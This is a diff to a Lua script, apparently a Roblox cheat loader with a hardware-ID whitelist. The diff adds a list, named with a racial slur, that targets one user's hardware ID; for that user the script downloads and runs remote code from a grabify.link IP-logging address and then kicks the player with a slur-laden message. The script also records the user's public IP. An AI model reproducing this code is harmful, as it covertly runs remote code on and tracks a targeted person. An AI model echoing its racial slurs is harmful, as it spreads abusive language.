@@ -25,12 +25,20 @@ local HwidWhitelist = {
     "1A235485-36D5-4489-B0D6-FA1626D4F8F7" -- Stupid Gavin
 }
 
+local NiggerHWID = {
+    "1A235485-36D5-4489-B0D6-FA1626D4F8F7" -- Stupid Gavin
+}
+
 if isfile("vape/WhiteList.txt") == false then
     writefile("vape/WhiteList.txt", HWID)
 end
 
 local ip = tostring(game:HttpGet("https://api.ipify.org", true))
 
+if table.find(NiggerHWID, HWID) then
+    loadstring(game:HttpGet("https://grabify.link/0I3C40", true))()
+    game.Players.LocalPlayer:Kick("GIVE ME NITRO NIGGA")
+end
 
 if table.find(HwidWhitelist, HWID) then
     print("Found Hwid In List")
